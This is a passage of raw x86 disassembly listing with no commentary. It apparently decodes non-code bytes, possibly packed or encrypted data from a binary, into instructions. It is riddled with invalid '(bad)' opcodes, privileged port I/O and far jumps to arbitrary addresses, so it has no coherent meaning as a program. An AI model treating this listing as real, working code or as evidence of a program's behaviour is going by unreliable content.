  418874:	adc    al,BYTE PTR [esi-0x64]
  418877:	dec    edx
  418878:	and    eax,0x503d3222
  41887d:	ja     0x4188d9
  41887f:	cmp    edi,DWORD PTR ds:0x380b2f38
  418885:	sti    
  418886:	(bad)  
  418887:	loopne 0x418890
  418889:	xchg   ecx,eax
  41888a:	dec    ebx
  41888b:	sbb    DWORD PTR [esi+0x27],edi
  41888e:	test   dh,ah
  418890:	sub    edi,edx
  418892:	fidivr WORD PTR [edi]
  418894:	jne    0x4188e7
  418896:	xchg   edx,eax
  418897:	sub    ch,dh
  418899:	lahf   
  41889a:	retf   0x9c51
  41889d:	dec    esi
  41889e:	jne    0x41886e
  4188a0:	out    dx,eax
  4188a1:	sub    DWORD PTR [ecx-0x22281213],edx
  4188a7:	mov    DWORD PTR ds:0x17b0c1c0,esp
  4188ad:	xchg   esp,edx
  4188af:	pop    ss
  4188b0:	test   eax,0xcff94fc
  4188b5:	mov    DWORD PTR [eax-0x179f2c54],esi
  4188bb:	repnz lods al,BYTE PTR ds:[esi]
  4188bd:	test   eax,0xb86cca33
  4188c2:	mov    dl,0x5
  4188c4:	fs cdq 
  4188c6:	mov    ch,0xc3
  4188c8:	in     eax,dx
  4188c9:	or     edi,DWORD PTR [esi+0x33]
  4188cc:	sbb    DWORD PTR [eax+ebp*4+0x71],0xffffffc1
  4188d1:	mov    dh,0x81
  4188d3:	je     0x418874
  4188d5:	fistp  DWORD PTR [ebx-0x11]
  4188d8:	test   ebx,edx
  4188da:	fstp   QWORD PTR [edi+0x297efdd9]
  4188e0:	(bad)  
  4188e1:	pop    esi
  4188e2:	stc    
  4188e3:	cs push esp
  4188e5:	cmp    edx,esp
  4188e7:	pop    ebx
  4188e8:	inc    ebp
  4188e9:	int3   
  4188ea:	test   BYTE PTR [ebx-0x14b10e41],ch
  4188f0:	stc    
  4188f1:	call   0x248e:0x4888ad3
  4188f8:	xchg   esp,eax
  4188f9:	clc    
  4188fa:	add    esp,0x6ac4e6b5
  418900:	push   ebp
  418901:	xor    eax,0x5d072cef
  418906:	dec    ebp
  418907:	push   cs
  418908:	popa   
  418909:	jns    0x418935
  41890b:	loope  0x418989
  41890d:	add    bl,BYTE PTR [ebx+0x10]
  418910:	pop    esp
  418911:	pushf  
  418912:	loop   0x41892d
  418914:	and    esp,ecx
  418916:	cmp    esp,DWORD PTR [edx]
  418918:	adc    al,BYTE PTR [ebp-0x266b9082]
  41891e:	mov    BYTE PTR [ebp-0x14],bh
  418921:	mov    eax,0xfb0303d5
  418926:	clc    
  418927:	mov    ds:0x4793e639,eax
  41892c:	cmp    bl,BYTE PTR [ecx-0xd317d72]
  418932:	xchg   esp,eax
  418933:	inc    ebp
  418934:	pop    esi
  418935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418936:	mov    ch,0xd6
  418938:	xor    dl,bl
  41893a:	mov    esi,0x7829706a
  41893f:	into   
  418940:	add    edi,esp
  418942:	dec    edx
  418943:	in     eax,dx
  418944:	add    al,bl
  418946:	push   ecx
  418947:	push   0xa9c2e5b0
  41894c:	pop    edx
  41894d:	lahf   
  41894e:	sbb    DWORD PTR [edi+0x74],esi
  418951:	repz cld 
  418953:	sub    DWORD PTR [eax-0x64f8094f],ecx
  418959:	sub    dh,cl
  41895b:	sub    DWORD PTR [edx-0x1a],esp
  41895e:	imul   ecx,DWORD PTR [ecx+edx*8-0x17],0xb9934d34
  418966:	push   ecx
  418967:	push   0xe016eefb
  41896c:	repnz sbb DWORD PTR [edi+0x26],edx
  418970:	dec    eax
  418971:	mov    bh,0xff
  418973:	fsubr  st,st(0)
  418975:	cmp    al,BYTE PTR [ebp+0x352a394b]
  41897b:	test   DWORD PTR [ebx-0x6f4c0bcc],edi
  418981:	push   ebp
  418982:	int3   
  418983:	cmc    
  418984:	adc    eax,DWORD PTR [ecx-0x681b7d99]
  41898a:	(bad)
  41898e:	and    esi,DWORD PTR [eax-0x80]
  418991:	test   BYTE PTR [edx+0x150cf551],cl
  418997:	xchg   ebp,eax
  418998:	add    dl,BYTE PTR [ecx+0x25]
  41899b:	mov    bp,0x9b48
  41899f:	mov    bl,0x32
  4189a1:	test   eax,0x8df37047
  4189a6:	mov    dl,BYTE PTR [ebp+0x68]
  4189a9:	arpl   WORD PTR ds:0x1a8d5050,ax
  4189af:	sbb    eax,0x87a51b2e
  4189b4:	lods   al,BYTE PTR ds:[esi]
  4189b5:	cmp    ecx,ebp
  4189b7:	imul   ebp,DWORD PTR [esi+0x52166ed9],0xace6749a
  4189c1:	leave  
  4189c2:	imul   eax,DWORD PTR [esi+0x57],0xa
  4189c6:	mov    bl,0xa2
  4189c8:	add    BYTE PTR [edx-0x77fe0019],dl
  4189ce:	inc    esp
  4189cf:	int    0x19
  4189d1:	fucom  st(0)
  4189d3:	fstp   DWORD PTR [esi]
  4189d5:	in     eax,dx
  4189d6:	je     0x418a31
  4189d8:	mov    esp,fs
  4189da:	iret   
  4189db:	mov    ch,0x15
  4189dd:	and    DWORD PTR [edx-0x4774f12c],ecx
  4189e3:	cmp    ecx,DWORD PTR [ebx-0x7b]
  4189e6:	int3   
  4189e7:	ins    BYTE PTR es:[edi],dx
  4189e8:	mov    dh,0x96
  4189ea:	fstp   TBYTE PTR [ebx]
  4189ec:	repz cmp eax,0x25cc0e94
  4189f2:	dec    esp
  4189f3:	pop    ss
  4189f4:	and    al,0xc6
  4189f6:	jno    0x4189ff
  4189f8:	ret    0x9658
  4189fb:	or     eax,0x2ddcf578
  418a00:	push   0x22f8f807
  418a05:	push   edi
  418a06:	sahf   
  418a07:	or     eax,0xd156fa28
  418a0c:	add    eax,DWORD PTR [ecx+0x11]
  418a0f:	test   BYTE PTR [esi],ah
  418a11:	add    BYTE PTR ds:0xda0e4250,0x62
  418a18:	aaa    
  418a19:	xor    DWORD PTR fs:[edi-0x67b812cc],eax
  418a20:	mov    al,ds:0xd4df6f52
  418a25:	mov    bl,0xa
  418a27:	(bad)  
  418a28:	jo     0x418a5b
  418a2a:	pop    ds
  418a2b:	addr16 inc ecx
  418a2d:	cli    
  418a2e:	sub    eax,0x64024437
  418a33:	nop
  418a34:	add    esi,DWORD PTR [ecx]
  418a36:	lea    ecx,[edx-0x6f]
  418a39:	(bad)  
  418a3c:	inc    esp
  418a3d:	repz repz push ebx
  418a40:	pop    ss
  418a41:	pusha  
  418a42:	pop    ebx
  418a43:	dec    esp
  418a44:	cmp    al,0x83
  418a46:	ror    BYTE PTR [edx+0x44],0xc0
  418a4a:	xchg   DWORD PTR ds:0xbc926b16,eax
  418a50:	lea    esp,[esi-0x28d68a91]
  418a56:	aaa    
  418a57:	call   0x5165672e
  418a5c:	int    0x32
  418a5e:	(bad)  
  418a5f:	jns    0x418a90
  418a61:	in     al,0x7
  418a63:	or     DWORD PTR [ebp-0x55aa1486],edi
  418a69:	pop    edi
  418a6a:	mov    ecx,0xf48fa614
  418a6f:	ja     0x418ab6
  418a71:	push   esi
  418a72:	and    BYTE PTR [ebp-0x190297ba],cl
  418a78:	fcom   QWORD PTR [edi+0x63d09cee]
  418a7e:	ss or  eax,0xdbb6ee69
  418a84:	imul   ecx,DWORD PTR [esi+0x3c],0xc
  418a88:	bound  ecx,QWORD PTR ds:[ebp+0x4d026f06]
  418a8f:	pop    esp
  418a90:	mov    bl,0x60
  418a92:	pusha  
  418a93:	or     ch,BYTE PTR [edx-0x5e]
  418a96:	das    
  418a97:	scas   eax,DWORD PTR es:[edi]
  418a98:	das    
  418a99:	loope  0x418a58
  418a9b:	jae    0x418a8c
  418a9d:	cld    
  418a9e:	xchg   ebx,eax
  418a9f:	(bad)  
  418aa0:	div    DWORD PTR [ecx]
  418aa2:	sbb    al,0x86
  418aa4:	push   cs
  418aa5:	inc    ebp
  418aa6:	mov    gs,ebx
  418aa8:	in     eax,0x11
  418aaa:	xchg   DWORD PTR [eax+0x2719ac4e],ecx
  418ab0:	push   esp
  418ab1:	into   
  418ab2:	(bad)  
  418ab3:	iret   
  418ab4:	iret   
  418ab5:	lds    esi,FWORD PTR [esi+0x56]
  418ab8:	test   al,0xb2
  418aba:	dec    ebx
  418abb:	xchg   esi,eax
  418abc:	ret    
  418abd:	jge    0x418a7d
  418abf:	adc    DWORD PTR [edx-0x28c4bb48],eax
  418ac5:	push   0xffffffe5
  418ac7:	or     cl,BYTE PTR [edi]
  418ac9:	mov    ds:0x83aefeee,eax
  418ace:	repnz rcl edi,1
  418ad1:	and    DWORD PTR [ebp-0x6d],ecx
  418ad4:	fsub   st,st(4)
  418ad6:	outs   dx,DWORD PTR ss:[esi]
  418ad8:	jmp    0x2baffd0b
  418add:	pusha  
  418ade:	mov    ds:0x30241446,al
  418ae3:	sub    ebx,DWORD PTR [eax]
  418ae5:	mov    eax,0xea7bd275
  418aea:	inc    ecx
  418aeb:	cmp    ax,0x7bc0
  418aef:	add    edi,DWORD PTR [ebx]
  418af1:	mov    cl,0x60
  418af3:	scas   al,BYTE PTR es:[edi]
  418af4:	lahf   
  418af5:	push   es
  418af6:	sbb    eax,DWORD PTR [ecx+0x14]
  418af9:	rol    BYTE PTR [ecx-0x3f],0x75
  418afd:	pushf  
  418afe:	mov    esp,0xa3b5be37
  418b03:	jbe    0x418b67
  418b05:	inc    esp
  418b06:	aad    0x2b
  418b08:	inc    esp
  418b09:	outs   dx,BYTE PTR ds:[esi]
  418b0a:	or     ch,dh
  418b0c:	test   eax,ebx
  418b0e:	aaa    
  418b0f:	arpl   sp,dx
  418b11:	xchg   ecx,eax
  418b12:	nop
  418b13:	push   esi
  418b14:	aam    0x17
  418b16:	in     al,0xfc
  418b18:	call   0x698f:0x82c3f5c9
  418b1f:	mov    esp,0xb7e9ba66
  418b24:	dec    edi
  418b25:	mov    ch,0xae
  418b28:	sbb    ah,BYTE PTR [ebx-0x49]
  418b2b:	rcr    BYTE PTR [edx-0x62],cl
  418b2e:	push   ss
  418b2f:	sbb    DWORD PTR ds:0xdb11db8,edx
  418b35:	and    al,dl
  418b37:	es mov al,0x69
  418b3a:	and    edi,ebp
  418b3c:	mov    esi,es
  418b3e:	aam    0x25
  418b40:	mov    esp,0x2ffb1bd8
  418b45:	xchg   ebx,eax
  418b46:	inc    edi
  418b47:	mov    ds:0x4d65261d,al
  418b4c:	pop    eax
  418b4d:	ret    0x2da9
  418b50:	xchg   ebx,eax
  418b51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b52:	sahf   
  418b53:	in     al,dx
  418b54:	fbld   TBYTE PTR [ebx]
  418b56:	xlat   BYTE PTR ds:[ebx]
  418b57:	jmp    0x418adf
  418b59:	jbe    0x418b9e
  418b5b:	add    eax,0xab7d2693
  418b60:	add    DWORD PTR [eax-0x3e336901],esi
  418b66:	(bad)  
  418b67:	and    al,BYTE PTR [ebx+0x2617a761]
  418b6d:	int    0xf2
  418b6f:	push   ss
  418b70:	ss sbb al,0xee
  418b73:	mov    edx,0xeb149622
  418b78:	clc    
  418b79:	add    DWORD PTR [eax+0x44],edi
  418b7c:	out    0x3c,al
  418b7e:	test   eax,0x15223d26
  418b83:	cwde   
  418b84:	mov    ah,0xc2
  418b86:	fcom   DWORD PTR [edx+0x4e]
  418b89:	aaa    
  418b8a:	aad    0xc3
  418b8c:	xor    cl,bh
  418b8e:	cmp    DWORD PTR ds:0xe506045,0xffffffa5
  418b95:	pop    eax
  418b96:	loopne 0x418b80
  418b98:	ja     0x418b1b
  418b9a:	push   esi
  418b9b:	stos   BYTE PTR es:[edi],al
  418b9c:	or     DWORD PTR [esi+0x187f342a],edx
  418ba2:	pop    edx
  418ba3:	mov    esp,0x55c1a6ba
  418ba8:	or     BYTE PTR [edi+0x4],0x12
  418bac:	xchg   ecx,eax
  418bad:	les    esp,FWORD PTR [ecx-0x3b64ecbf]
  418bb3:	jge    0x418bcb
  418bb5:	ror    bh,0x22
  418bb8:	xchg   ebx,eax
  418bb9:	(bad)  
  418bba:	lock std 
  418bbc:	sub    ah,BYTE PTR [ebx+0x10d2115a]
  418bc2:	hlt    
  418bc3:	bound  ebp,QWORD PTR [edi-0x4a072aa7]
  418bc9:	mov    eax,ds:0x1823afa9
  418bce:	push   ss
  418bcf:	(bad)  
  418bd0:	xor    DWORD PTR [ebp+0x43],eax
  418bd3:	mov    ecx,0x9a0a3941
  418bd8:	popa   
  418bd9:	test   BYTE PTR [edx],dl
  418bdb:	jo     0x418b87
  418bdd:	or     bl,BYTE PTR [eax+esi*8-0x321749c1]
  418be4:	pop    es
  418be5:	(bad)  
  418be6:	mov    dh,0xb1
  418be8:	sbb    al,0x24
  418bea:	ret    
  418beb:	aaa    
  418bec:	ins    BYTE PTR es:[edi],dx
  418bed:	or     al,0x91
  418bef:	popf   
  418bf0:	mov    ebx,0xc2881c67
  418bf5:	loopne 0x418b8f
  418bf7:	jge    0x418b94
  418bf9:	mov    ah,0x30
  418bfb:	xchg   ebp,eax
  418bfc:	cli    
  418bfd:	(bad)  
  418bfe:	fcomp  QWORD PTR [ebx-0x641902a5]
  418c04:	fcmovu st,st(0)
  418c06:	fnclex 
  418c08:	xchg   edi,eax
  418c09:	bound  edx,QWORD PTR [edx]
  418c0b:	in     eax,0xb7
  418c0d:	xchg   edx,eax
  418c0e:	cmp    eax,0x9fb7daf8
  418c13:	xchg   BYTE PTR [eax],dh
  418c15:	fisubr WORD PTR [eax-0x73]
  418c18:	push   ds
  418c19:	cmp    BYTE PTR [edi+eiz*8-0x6c],cl
  418c1d:	xchg   edx,eax
  418c1e:	pop    edi
  418c1f:	add    ecx,ebp
  418c21:	pop    ss
  418c22:	stos   BYTE PTR es:[edi],al
  418c23:	cmp    BYTE PTR [edx+0xe],al
  418c26:	ja     0x418c7b
  418c28:	mov    cs,WORD PTR [edi]
  418c2a:	mov    ds:0x16b5dbc2,eax
  418c2f:	nop
  418c30:	or     BYTE PTR [edx+0x58c68ac],al
  418c36:	icebp  
  418c37:	sub    edi,DWORD PTR [esi-0x1ad90af8]
  418c3d:	fs cdq 
  418c3f:	outs   dx,DWORD PTR ds:[esi]
  418c40:	mov    esi,0x9718d6aa
  418c45:	or     BYTE PTR [ebx-0x65763c94],bl
  418c4b:	inc    esi
  418c4c:	pop    edi
  418c4d:	fsub   QWORD PTR [ecx+edx*1]
  418c50:	shr    DWORD PTR [ebp+0x5e8a44d4],0x9a
  418c57:	mov    esi,0x63ecca31
  418c5c:	lds    edi,FWORD PTR [esi-0x30]
  418c5f:	mov    eax,0x15dbe088
  418c64:	xchg   BYTE PTR [eax],cl
  418c66:	jecxz  0x418cdb
  418c68:	js     0x418c6a
  418c6a:	inc    esp
  418c6b:	cdq    
  418c6c:	leave  
  418c6d:	xchg   DWORD PTR [ebx+0x77],esp
  418c70:	call   0x76930ba7
  418c75:	inc    ebx
  418c76:	xchg   edx,eax
  418c77:	add    BYTE PTR [ebp+0x47243fba],bl
  418c7d:	sub    DWORD PTR [ecx+ecx*2],esi
  418c80:	jmp    0x73a4:0x4d64bf92
  418c87:	xchg   ecx,eax
  418c88:	xchg   edx,eax
  418c89:	fadd   st(0),st
  418c8b:	das    
  418c8c:	in     al,dx
  418c8d:	mov    al,0xac
  418c8f:	push   ds
  418c90:	sub    ebp,edi
  418c92:	xchg   ecx,eax
  418c93:	add    DWORD PTR [edi+ebp*1+0x75d5f033],edx
  418c9a:	(bad)  
  418c9b:	sbb    eax,0x72f6d7c4
  418ca0:	pushw  es
  418ca2:	aas    
  418ca3:	inc    edi
  418ca4:	cmp    edi,DWORD PTR [ebp+0x4fd9cc5c]
  418caa:	dec    edi
  418cab:	xchg   ebx,eax
  418cac:	scas   al,BYTE PTR es:[edi]
  418cad:	fild   DWORD PTR ds:0x7683b253
  418cb3:	sub    ah,al
  418cb5:	inc    ebp
  418cb6:	imul   eax,DWORD PTR [edi+0xe],0xd9a63c9
  418cbd:	push   eax
  418cbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cbf:	scas   eax,DWORD PTR es:[edi]
  418cc0:	mov    WORD PTR ds:0x646d7111,ds
  418cc6:	and    DWORD PTR [ecx-0x24],ebx
  418cc9:	xchg   esp,eax
  418cca:	int    0x4
  418ccc:	fdiv   DWORD PTR [ebp+edi*8-0x544c130f]
  418cd3:	sub    ecx,0x44
  418cd6:	pop    ecx
  418cd7:	mov    ebp,0x64bc342d
  418cdc:	es int3 
  418cde:	arpl   WORD PTR [ebx],dx
  418ce0:	retf   0x94ae
  418ce3:	fisttp QWORD PTR [ebp+0x50]
  418ce6:	(bad)  
  418ce7:	cld    
  418ce8:	cwde   
  418ce9:	sub    dh,BYTE PTR [esi+ebp*8+0x65]
  418ced:	pop    edi
  418cee:	pop    ds
  418cef:	mov    esp,0x648ecf0a
  418cf4:	mov    ds:0x99870d67,eax
  418cf9:	mov    al,0x7a
  418cfb:	in     al,dx
  418cfc:	push   0xffffffe1
  418cfe:	push   eax
  418cff:	push   ds
  418d00:	fisub  DWORD PTR [edi-0x1]
  418d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d04:	and    al,0x2d
  418d06:	jns    0x418d36
  418d08:	imul   bl
  418d0a:	pop    edx
  418d0b:	mov    al,0x2f
  418d0d:	mov    bl,0x3a
  418d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d10:	xor    BYTE PTR [edx],bl
  418d12:	fcmovbe st,st(6)
  418d14:	add    eax,0x3b77eb08
  418d19:	adc    al,0x28
  418d1b:	loop   0x418d19
  418d1d:	lods   eax,DWORD PTR ds:[esi]
  418d1e:	daa    
  418d1f:	pushf  
  418d20:	push   ebp
  418d21:	xor    BYTE PTR [eax+0x31],0x43
  418d25:	das    
  418d26:	xchg   ecx,eax
  418d27:	mov    bl,0x1b
  418d29:	push   0x4f
  418d2b:	hlt    
  418d2c:	jle    0x418d7f
  418d2e:	stc    
  418d2f:	jl     0x418d18
  418d31:	push   esi
  418d32:	loope  0x418d9c
  418d34:	hlt    
  418d35:	aad    0xbd
  418d37:	lods   eax,DWORD PTR ds:[esi]
  418d38:	(bad)  
  418d39:	hlt    
  418d3a:	jae    0x418d0c
  418d3c:	dec    ebp
  418d3d:	pop    DWORD PTR es:[edi+0x48181b66]
  418d44:	add    BYTE PTR [eax+0x7d8b3e4e],al
  418d4a:	dec    ebx
  418d4b:	and    esi,DWORD PTR [edi+0x7010265]
  418d51:	pop    edx
  418d52:	pop    edx
  418d53:	mov    eax,ds:0x1867123a
  418d58:	xchg   edi,eax
  418d59:	push   esp
  418d5a:	adc    BYTE PTR [edx+0x0],bh
  418d5d:	cli    
  418d5e:	popf   
  418d5f:	inc    ebp
  418d60:	ror    DWORD PTR [edi],cl
  418d62:	cmp    DWORD PTR [eax+0x510d2c91],esi
  418d68:	jecxz  0x418dbc
  418d6a:	xor    BYTE PTR [ecx-0x4f3c7ba0],dl
  418d70:	xchg   edi,eax
  418d71:	retf   
  418d72:	cld    
  418d73:	jb     0x418d01
  418d75:	adc    eax,0x7ef6281a
  418d7a:	mov    dh,0x0
  418d7c:	int3   
  418d7d:	cmp    esi,esp
  418d7f:	ins    BYTE PTR es:[edi],dx
  418d80:	pushf  
  418d81:	inc    esp
  418d82:	repnz add eax,0x30b73ee
  418d88:	adc    eax,0x8f6651b
  418d8d:	cmc    
  418d8e:	mov    eax,0xc89a190c
  418d93:	xor    cl,dh
  418d95:	retf   
  418d96:	sbb    bh,BYTE PTR [esi-0x1c]
  418d99:	repnz (bad) 
  418d9b:	ret    
  418d9c:	mul    edi
  418d9e:	jmp    0x418d7e
  418da0:	dec    esi
  418da1:	das    
  418da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418da3:	aam    0x55
  418da5:	loope  0x418d9d
  418da7:	imul   edi,esp,0xffffffc0
  418daa:	jno    0x418d5a
  418dac:	cmp    cl,0xc2
  418daf:	jp     0x418dd1
  418db1:	sub    eax,edx
  418db3:	in     al,0x36
  418db5:	jge    0x418d55
  418db7:	pop    ecx
  418db8:	push   esi
  418db9:	stc    
  418dba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dbb:	and    dh,BYTE PTR [ecx]
  418dbd:	int3   
  418dbe:	scas   eax,DWORD PTR es:[edi]
  418dbf:	dec    edx
  418dc0:	dec    ecx
  418dc1:	fs icebp 
  418dc3:	xor    eax,0xfda531dc
  418dc8:	jae    0x418da8
  418dca:	ss sub eax,0x692d0570
  418dd0:	out    0xfd,eax
  418dd2:	jne    0x418d75
  418dd4:	inc    esp
  418dd5:	jl     0x418ddf
  418dd7:	mov    dh,0xc8
  418dd9:	es xchg ecx,eax
  418ddb:	and    al,0x6b
  418ddd:	sbb    eax,0xa83a8e96
  418de2:	int    0xa0
  418de4:	sbb    BYTE PTR [ecx],bh
  418de6:	and    al,0x86
  418de8:	rol    ch,cl
  418dea:	daa    
  418deb:	call   0x5289db69
  418df0:	sbb    ebx,DWORD PTR [esi+0x18ae4c1]
  418df6:	push   cs
  418df7:	ret    
  418df8:	inc    eax
  418df9:	push   ebx
  418dfa:	push   edx
  418dfb:	pop    eax
  418dfc:	stos   BYTE PTR es:[edi],al
  418dfd:	cmp    eax,0x385b28ad
  418e02:	adc    eax,0xc47dbab3
  418e07:	(bad)  
  418e08:	xor    DWORD PTR [ebp-0x2259eac0],edx
  418e0e:	test   eax,0xf8a9a4c4
  418e13:	sub    eax,0x10a79725
  418e18:	push   0x836b9076
  418e1d:	out    dx,al
  418e1e:	cdq    
  418e1f:	not    BYTE PTR [edi]
  418e21:	rcr    BYTE PTR [eax+0x64828756],0x1b
  418e28:	nop
  418e29:	in     al,dx
  418e2a:	sub    eax,esi
  418e2c:	push   eax
  418e2d:	xor    al,0xd0
  418e2f:	or     DWORD PTR [ebx],ecx
  418e31:	ins    DWORD PTR es:[edi],dx
  418e32:	or     eax,0x5f322f29
  418e37:	sbb    al,0xf8
  418e39:	mov    cl,0x1c
  418e3b:	popf   
  418e3c:	or     eax,0x2b80889d
  418e41:	pop    ds
  418e42:	jecxz  0x418e0a
  418e44:	(bad)
  418e48:	loop   0x418ebd
  418e4a:	ss ja  0x418dd1
  418e4d:	fcmovnbe st,st(6)
  418e4f:	and    al,bl
  418e51:	or     al,0x11
  418e53:	(bad)  
  418e54:	push   DWORD PTR [edx-0x4c2c7014]
  418e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e5b:	or     DWORD PTR [eax],esp
  418e5d:	in     eax,0x9e
  418e5f:	mov    ch,0x52
  418e61:	xchg   ecx,eax
  418e62:	and    BYTE PTR [esi],bh
  418e64:	or     eax,0x4b0ebb65
  418e69:	ins    DWORD PTR es:[edi],dx
  418e6a:	hlt    
  418e6b:	jle    0x418e8e
  418e6d:	xchg   esp,eax
  418e6e:	jge    0x418e87
  418e70:	pop    esi
  418e71:	and    ecx,DWORD PTR [esi-0x26]
  418e74:	jns    0x418e13
  418e76:	jne    0x418ece
  418e78:	imul   edi,DWORD PTR [eax],0xdd7cad95
  418e7e:	sti    
  418e7f:	pop    ds
  418e80:	jo     0x418e7e
  418e82:	stos   BYTE PTR es:[edi],al
  418e83:	push   DWORD PTR [eax]
  418e85:	fcomp  DWORD PTR [edx]
  418e87:	dec    ebp
  418e88:	jp     0x418ea2
  418e8a:	xor    ebx,DWORD PTR [esi+0x14]
  418e8d:	les    ecx,FWORD PTR [ebx]
  418e8f:	out    0x3e,eax
  418e91:	cs mov ah,0x24
  418e94:	jl     0x418e1d
  418e96:	xchg   ebx,eax
  418e97:	dec    ebp
  418e98:	arpl   WORD PTR [ebx-0x32dc2268],si
  418e9e:	pusha  
  418e9f:	out    dx,eax
  418ea0:	push   esi
  418ea1:	sbb    DWORD PTR [ebx+0x3],ebx
  418ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ea5:	mov    eax,ds:0xa2533b9d
  418eaa:	test   al,0x50
  418eac:	adc    al,0xe3
  418eae:	mov    DWORD PTR [eax],ebp
  418eb0:	push   ebp
  418eb1:	scas   al,BYTE PTR es:[edi]
  418eb2:	and    esp,edi
  418eb4:	cmp    eax,0x8edd650f
  418eb9:	mov    ecx,0xd6e1103c
  418ebe:	gs xchg ebp,eax
  418ec0:	js     0x418ea4
  418ec2:	mov    esp,0xa49c19a6
  418ec7:	mov    ch,BYTE PTR [esi+0x5361288b]
  418ecd:	test   eax,0xc0ad44cf
  418ed2:	pop    ebp
  418ed3:	mov    eax,ds:0x383f3cd7
  418ed8:	adc    DWORD PTR [ebp+0x629fdcd5],0xffffff98
  418edf:	sbb    DWORD PTR [edx],0xdbbef04
  418ee5:	dec    edx
  418ee6:	cmp    eax,0xcadd4308
  418eeb:	cwde   
  418eec:	mov    edx,ds
  418eee:	cmp    bh,BYTE PTR [edi]
  418ef0:	rcr    DWORD PTR [ebp-0x67652b4a],0xbb
  418ef7:	fmul   QWORD PTR [ecx+0x5480200f]
  418efd:	(bad)  
  418efe:	xchg   esi,eax
  418eff:	mov    ch,0xd1
  418f01:	dec    ebp
  418f02:	fld    TBYTE PTR [edi+0x5aef7ea]
  418f08:	add    ebx,esi
  418f0a:	adc    DWORD PTR [edx+ecx*8+0x60],eax
  418f0e:	out    dx,al
  418f0f:	inc    edx
  418f10:	and    ah,BYTE PTR [ebp+0x34]
  418f13:	push   ss
  418f14:	or     edx,DWORD PTR ds:0xa2a9d0cd
  418f1a:	aas    
  418f1b:	add    eax,edi
  418f1d:	lock adc al,0x50
  418f20:	out    0x24,al
  418f22:	xor    al,0x5c
  418f24:	and    DWORD PTR [ecx],0x29df5854
  418f2a:	and    eax,0x68198228
  418f2f:	push   0xffffffa6
  418f31:	push   ecx
  418f32:	sub    DWORD PTR [ebp-0x8690885],esp
  418f38:	test   DWORD PTR [edi-0x369d4161],esi
  418f3e:	lock hlt 
  418f40:	sysenter 
  418f42:	mov    edi,DWORD PTR [edx+ecx*2+0x7b1efbb8]
  418f49:	mul    DWORD PTR [edx-0x55289d20]
  418f4f:	adc    ch,BYTE PTR [edx+esi*8+0x731c8230]
  418f56:	or     DWORD PTR [ebx],edi
  418f58:	and    ebp,DWORD PTR [esi-0x6c]
  418f5b:	and    al,0x5c
  418f5d:	in     eax,0x36
  418f5f:	retf   
  418f60:	leave  
  418f61:	mov    esp,0xd534d69
  418f66:	out    0x3,al
  418f68:	add    eax,0x3df37456
  418f6d:	sahf   
  418f6e:	xchg   ecx,eax
  418f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f70:	sbb    bh,BYTE PTR [ebx+0x76]
  418f73:	imul   BYTE PTR [ebx]
  418f75:	bound  esp,QWORD PTR [edx]
  418f77:	mov    ds:0xbde7e10d,eax
  418f7c:	and    dl,0x1c
  418f7f:	nop    ebp
  418f82:	or     esi,ebp
  418f84:	mov    eax,ds:0x58235f97
  418f89:	and    bh,BYTE PTR [ebx+esi*4]
  418f8c:	repz mov bl,0x2c
  418f8f:	call   0xb522:0x370ee401
  418f96:	mov    eax,ds:0x281d635c
  418f9b:	add    edi,edx
  418f9d:	push   edx
  418f9e:	mov    esi,0x9708e1fd
  418fa3:	loopne 0x418ffc
  418fa5:	sub    eax,0xc40b0d0b
  418faa:	cmc    
  418fab:	cmp    esp,DWORD PTR [ecx-0x28d149ab]
  418fb1:	pop    ebp
  418fb2:	or     dl,BYTE PTR [ebx+0x75]
  418fb5:	cs dec eax
  418fb7:	addr16 loopne 0x418f88
  418fba:	sub    edi,esp
  418fbc:	add    eax,0x71b116c
  418fc1:	ss enter 0xc7ee,0xa6
  418fc6:	lods   eax,DWORD PTR ds:[esi]
  418fc7:	adc    DWORD PTR [eax],ebx
  418fc9:	push   ecx
  418fca:	and    edi,esi
  418fcc:	int3   
  418fcd:	mov    ss,WORD PTR [ebx]
  418fcf:	push   cs
  418fd0:	add    eax,0x53bb3c4e
  418fd5:	sbb    al,dh
  418fd7:	outs   dx,DWORD PTR ds:[esi]
  418fd8:	cmp    al,0xef
  418fda:	loopne 0x419007
  418fdc:	sahf   
  418fdd:	dec    edi
  418fde:	mov    eax,0xd6c69dd5
  418fe3:	rol    edi,1
  418fe5:	or     BYTE PTR [eax+0x589332e0],ch
  418feb:	xchg   ebp,eax
  418fec:	idiv   ecx
  418fee:	fldenv [eax]
  418ff0:	cmc    
  418ff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ff2:	cmp    BYTE PTR [edx-0x510fd005],bh
  418ff8:	popa   
  418ff9:	pushf  
  418ffa:	add    eax,0xdad5f58a
  418fff:	mov    eax,ds:0x928c1371
  419004:	and    eax,0x10ca9ef
  419009:	scas   al,BYTE PTR es:[edi]
  41900a:	cmp    ebp,edx
  41900c:	or     al,0x26
  41900e:	push   cs
  41900f:	(bad)  
  419010:	mov    WORD PTR [edi+0x63],fs
  419013:	nop
  419014:	push   ebx
  419015:	fldenv fs:[edi+0x34790775]
  41901c:	daa    
  41901d:	xchg   edi,eax
  41901e:	pop    ss
  41901f:	ins    DWORD PTR es:[edi],dx
  419020:	sti    
  419021:	call   0x43522da3
  419026:	xlat   BYTE PTR ds:[ebx]
  419027:	push   ds
  419028:	jp     0x419088
  41902a:	or     edi,ebx
  41902c:	retf   
  41902d:	imul   esi,eax,0xf9081be9
  419033:	pop    es
  419034:	test   al,0x78
  419036:	cwde   
  419037:	inc    edi
  419038:	jno    0x419009
  41903a:	out    0x69,al
  41903c:	(bad)  
  41903d:	stc    
  41903e:	pop    es
  41903f:	push   eax
  419040:	mov    DWORD PTR [ecx-0x30],ebx
  419043:	cwde   
  419044:	rol    eax,cl
  419046:	arpl   WORD PTR [esi+0x63],sp
  419049:	xchg   esi,eax
  41904a:	stos   DWORD PTR es:[edi],eax
  41904b:	push   esp
  41904c:	mov    edx,0x8f7bc457
